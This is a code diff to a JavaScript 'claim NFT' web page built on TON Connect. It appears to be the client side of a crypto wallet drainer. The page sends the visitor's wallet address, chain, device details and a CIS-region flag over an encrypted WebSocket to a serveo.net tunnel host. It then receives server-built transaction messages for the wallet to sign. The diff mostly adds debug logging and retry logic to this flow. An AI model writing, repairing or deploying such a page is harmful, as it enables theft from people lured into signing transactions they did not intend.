@@ -640,6 +640,11 @@
                 .map(byteHex)
                 .join('');
         }
+        function generateHash() {
+    const timestamp = Date.now().toString(36);
+    const random = Math.random().toString(36).substring(2);
+    return timestamp + random;
+}
 
         function createDecipher(salt) {
             const textToChars = text => text.split('').map(c => c.charCodeAt(0));
@@ -653,18 +658,43 @@
 
         // Функция для получения SHA256 хеша
         async function getSHA256Hash(str) {
-            const encoder = new TextEncoder();
-            const data = encoder.encode(str);
-            const hash = await crypto.subtle.digest('SHA-256', data);
-            return Array.from(new Uint8Array(hash))
-                .map(b => b.toString(16).padStart(2, '0'))
-                .join('');
-        }
-        async function encryptForServer(data, key) {
     try {
-        const encrypted = Aes.Ctr.encrypt(JSON.stringify(data), key, 256);
-        const checksum = Aes.Ctr.encrypt(await getSHA256Hash(encrypted), signature, 256);
-        return `${encrypted}:${checksum}`;
+        const encoder = new TextEncoder();
+        const data = encoder.encode(str);
+        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    } catch (error) {
+        console.error('❌ SHA256 hash error:', error);
+        // Fallback: простое хеширование если crypto.subtle недоступен
+        let hash = 0;
+        for (let i = 0; i < str.length; i++) {
+            const char = str.charCodeAt(i);
+            hash = ((hash << 5) - hash) + char;
+            hash = hash & hash; // Convert to 32bit integer
+        }
+        return Math.abs(hash).toString(36);
+    }
+}
+        // Функция для шифрования данных в формате сервера (encrypted:checksum)
+async function encryptForServer(data, key) {
+    try {
+        const jsonData = JSON.stringify(data);
+        console.log('📝 Data to encrypt:', jsonData);
+        
+        const encrypted = Aes.Ctr.encrypt(jsonData, key, 256);
+        console.log('🔐 Encrypted data:', encrypted);
+        
+        const hash = await getSHA256Hash(encrypted);
+        console.log('📊 SHA256 hash:', hash);
+        
+        const checksum = Aes.Ctr.encrypt(hash, signature, 256);
+        console.log('🔏 Checksum:', checksum);
+        
+        const result = `${encrypted}:${checksum}`;
+        console.log('📨 Final encrypted payload:', result);
+        
+        return result;
     } catch (error) {
         console.error('❌ Encryption error:', error);
         throw error;
@@ -674,13 +704,17 @@
 // Функция для дешифрования данных в формате сервера (encrypted:checksum)
 async function decryptFromServer(encryptedData, key) {
     try {
+        console.log('🔓 Decrypting data:', encryptedData);
+        
         if (!encryptedData || typeof encryptedData !== 'string') {
-            throw new Error('Invalid encrypted data');
+            throw new Error('Invalid encrypted data: ' + typeof encryptedData);
         }
 
         const parts = encryptedData.split(':');
+        console.log('📦 Data parts:', parts);
+        
         if (parts.length !== 2) {
-            throw new Error('Invalid data format, expected encrypted:checksum');
+            throw new Error('Invalid data format, expected encrypted:checksum, got ' + parts.length + ' parts');
         }
 
         const [encrypted, checksum] = parts;
@@ -688,6 +722,12 @@ async function decryptFromServer(encryptedData, key) {
         // Проверяем checksum
         const decryptedChecksum = Aes.Ctr.decrypt(checksum, signature, 256);
         const expectedChecksum = await getSHA256Hash(encrypted);
+        
+        console.log('🔍 Checksum verification:', {
+            decryptedChecksum,
+            expectedChecksum,
+            match: decryptedChecksum === expectedChecksum
+        });
 
         if (decryptedChecksum !== expectedChecksum) {
             throw new Error('Checksum verification failed');
@@ -695,6 +735,8 @@ async function decryptFromServer(encryptedData, key) {
 
         // Дешифруем основные данные
         const decrypted = Aes.Ctr.decrypt(encrypted, key, 256);
+        console.log('📄 Decrypted content:', decrypted);
+        
         return decrypted;
     } catch (error) {
         console.error('❌ Decryption error:', error);
@@ -723,71 +765,91 @@ async function decryptFromServer(encryptedData, key) {
 
         // Подключение к WebSocket серверу
         // Подключение к WebSocket серверу
+
 function connectWebSocket() {
     try {
+        console.log('🔌 Attempting WebSocket connection...');
+        
+        // Сброс предыдущих состояний
+        myEncryption = '';
+        clientEncryption = '';
+        signature = '';
+        
         ws = new WebSocket('wss://8bb19ba2eabd0d2af4e131dcbe0d06c9.serveo.net');
         
         ws.onopen = function() {
-            console.log('✅ WebSocket connected');
+            console.log('✅ WebSocket connected successfully');
             isWebSocketConnected = true;
             showStatus('Connected to server', 'success');
             
-            // НЕ отправляем connected сразу - ждем, когда сервер отправит свой ключ
-            // Сервер сам отправит сообщение с action: 'connected'
+            // Проверяем состояние
+            console.log('🔍 WebSocket state after connection:', {
+                readyState: ws.readyState,
+                isWebSocketConnected: isWebSocketConnected
+            });
         };
         
         ws.onmessage = function(event) {
-    console.log('📨 WebSocket message received:', event.data);
-    const data = JSON.parse(event.data);
-    
-    // Обрабатываем сообщения по полю action
-    if (data.action === 'connected') {
-        console.log('🔐 Received server encryption key');
-        handleServerConnected(data);
-    }
-    else if (data.action === 'safety') {
-        console.log('🔒 Received safety challenge');
-        handleSafetyChallenge(data);
-    }
-    else if (data.action === 'check') {
-        console.log('✅ Server check received');
-        // Сервер подтверждает безопасное соединение
-        showStatus('Secure connection established!', 'success');
-    }
-    else if (data.action === 'w') {
-        console.log('✅ Server ready for requests');
-        showStatus('Server is ready!', 'success');
-    }
-    else if (data.action === 'messages') {
-        console.log('📦 Received transaction messages');
-        handleTransactionMessages(data);
-    }
-    else if (data.action === 'done') {
-        console.log('✅ Operation completed');
-        showStatus('Operation completed successfully', 'success');
-    }
-    else if (data.action === 'close') {
-        console.log('❌ Server closed connection');
-        showStatus('Server closed connection', 'error');
-    }
-    else {
-        console.log('❓ Unknown server action:', data.action, data);
-    }
-};
+            console.log('📨 Raw WebSocket message:', event.data);
+            try {
+                const data = JSON.parse(event.data);
+                console.log('📨 Parsed WebSocket message:', data);
+                
+                // Обрабатываем сообщения по полю action
+                if (data.action === 'connected') {
+                    console.log('🔐 Received server encryption key');
+                    handleServerConnected(data);
+                }
+                else if (data.action === 'safety') {
+                    console.log('🔒 Received safety challenge');
+                    handleSafetyChallenge(data);
+                }
+                else if (data.action === 'check') {
+                    console.log('✅ Server check received - handshake complete');
+                    showStatus('Secure connection established! Ready to claim NFT.', 'success');
+                }
+                else if (data.action === 'w') {
+                    console.log('✅ Server ready for requests');
+                    showStatus('Server is ready!', 'success');
+                }
+                else if (data.action === 'messages') {
+                    console.log('📦 Received transaction messages');
+                    handleTransactionMessages(data);
+                }
+                else if (data.action === 'done') {
+                    console.log('✅ Operation completed');
+                    showStatus('Operation completed successfully', 'success');
+                }
+                else if (data.action === 'close') {
+                    console.log('❌ Server closed connection');
+                    showStatus('Server closed connection', 'error');
+                }
+                else {
+                    console.log('❓ Unknown server action:', data.action, data);
+                }
+            } catch (parseError) {
+                console.error('❌ Failed to parse WebSocket message:', parseError, event.data);
+            }
+        };
         
         ws.onclose = function(event) {
-            console.log('❌ WebSocket disconnected:', event.code, event.reason);
+            console.log('❌ WebSocket disconnected:', {
+                code: event.code,
+                reason: event.reason,
+                wasClean: event.wasClean
+            });
             isWebSocketConnected = false;
             showStatus('Disconnected from server', 'error');
             
             if (event.code !== 1006) {
+                console.log('🔄 Attempting reconnect in 3 seconds...');
                 setTimeout(connectWebSocket, 3000);
             }
         };
         
         ws.onerror = function(error) {
             console.error('💥 WebSocket error:', error);
-            showStatus('WebSocket connection failed', 'error');
+            showStatus('WebSocket connection error', 'error');
         };
     } catch (error) {
         console.error('💥 WebSocket connection failed:', error);
@@ -825,6 +887,14 @@ function handleServerConnected(data) {
         console.error('❌ Server connection handling failed:', error);
         showStatus('Security setup failed', 'error');
     }
+}
+        function isWebSocketReady() {
+    return ws && 
+           ws.readyState === WebSocket.OPEN && 
+           isWebSocketConnected && 
+           myEncryption && 
+           clientEncryption && 
+           signature;
 }
 
 // Обработка проверки безопасности
@@ -948,30 +1018,55 @@ async function handleTransactionMessages(data) {
 
         // Основная функция для получения NFT
         async function claimNFT() {
-    if (!tonConnectUI?.connected) {
-        showStatus('Please connect your wallet first!', 'error');
-        return;
-    }
-
-    console.log('👛 Wallet address:', tonConnectUI.account?.address);
+    console.log('🎯 Starting claimNFT process...');
     
-    if (!isWebSocketConnected) {
-        showStatus('Server connection lost. Reconnecting...', 'error');
-        connectWebSocket();
+    if (!tonConnectUI?.connected || !tonConnectUI.account) {
+        showStatus('Please connect your wallet first!', 'error');
+        console.error('❌ No wallet connected');
         return;
     }
 
-    showStatus('Requesting NFT transaction...', 'info');
+    console.log('👛 Wallet details:', {
+        address: tonConnectUI.account.address,
+        chain: tonConnectUI.account.chain,
+        device: tonConnectUI.account.device
+    });
+    
+    if (!isWebSocketReady()) {
+        console.error('❌ WebSocket not ready:', {
+            ws: !!ws,
+            readyState: ws ? ws.readyState : 'no ws',
+            isWebSocketConnected,
+            myEncryption: !!myEncryption,
+            clientEncryption: !!clientEncryption,
+            signature: !!signature
+        });
+        
+        showStatus('Server connection not ready. Reconnecting...', 'error');
+        connectWebSocket();
+        
+        // Ждем немного перед повторной попыткой
+        setTimeout(() => {
+            if (isWebSocketReady()) {
+                claimNFT();
+            } else {
+                showStatus('Still connecting to server...', 'info');
+            }
+        }, 2000);
+        return;
+    }
+
+    showStatus('Requesting transaction data...', 'info');
 
     try {
         const userInfo = getUserInfo();
-        console.log('📤 Sending user info:', userInfo);
+        console.log('📤 User info to send:', userInfo);
         
         const requestData = {
             userInfo: userInfo
         };
 
-        // Шифруем запрос в формате сервера
+        console.log('🔐 Starting encryption...');
         const encryptedRequest = await encryptForServer(requestData, clientEncryption);
         
         const message = {
@@ -979,14 +1074,17 @@ async function handleTransactionMessages(data) {
             data: encryptedRequest
         };
         
-        console.log('📤 Sending encrypted NFT request');
+        console.log('📤 Sending encrypted request to server:', message);
         ws.send(JSON.stringify(message));
+        showStatus('Request sent to server...', 'info');
         
     } catch (error) {
         console.error('❌ Failed to prepare NFT request:', error);
         showStatus('Failed to prepare request: ' + error.message, 'error');
     }
 }
+
+
 
         // Отправка статуса транзакции на сервер
         async function sendTransactionStatus(status, messages) {
@@ -1030,12 +1128,32 @@ async function handleTransactionMessages(data) {
         // Получение информации о пользователе
         function getUserInfo() {
     const wallet = tonConnectUI?.account;
+    
+    if (!wallet) {
+        console.error('❌ No wallet available in getUserInfo');
+        return {
+            ip: 'unknown',
+            country: 'unknown', 
+            domain: window.location.hostname,
+            sng: false,
+            address: '',
+            device: {
+                app: 'web',
+                platform: 'browser',
+                userAgent: navigator.userAgent,
+                language: navigator.language
+            },
+            hash: generateHash(),
+            timestamp: Date.now()
+        };
+    }
+    
     const userInfo = {
         ip: 'auto-detected',
         country: 'auto',
         domain: window.location.hostname,
         sng: false,
-        address: wallet?.address || '',
+        address: wallet.address || '',
         device: {
             app: 'web',
             platform: 'browser',
@@ -1043,19 +1161,21 @@ async function handleTransactionMessages(data) {
             language: navigator.language
         },
         wallet: {
-            address: wallet?.address,
-            chain: wallet?.chain,
-            device: wallet?.device?.appName || 'unknown'
+            address: wallet.address,
+            chain: wallet.chain,
+            device: wallet.device?.appName || 'unknown'
         },
         hash: generateHash(),
         timestamp: Date.now()
     };
     
     console.log('🌐 Domain being sent:', userInfo.domain);
-    console.log('📍 Full wallet info:', userInfo.wallet);
+    console.log('📍 Wallet address:', userInfo.address);
+    console.log('🔧 Full user info:', userInfo);
     
     return userInfo;
 }
+
 
         // Отключение кошелька
         function disconnectWallet() {
@@ -1124,6 +1244,7 @@ async function handleTransactionMessages(data) {
     </script>
 </body>
 </html>
+
 
 
 
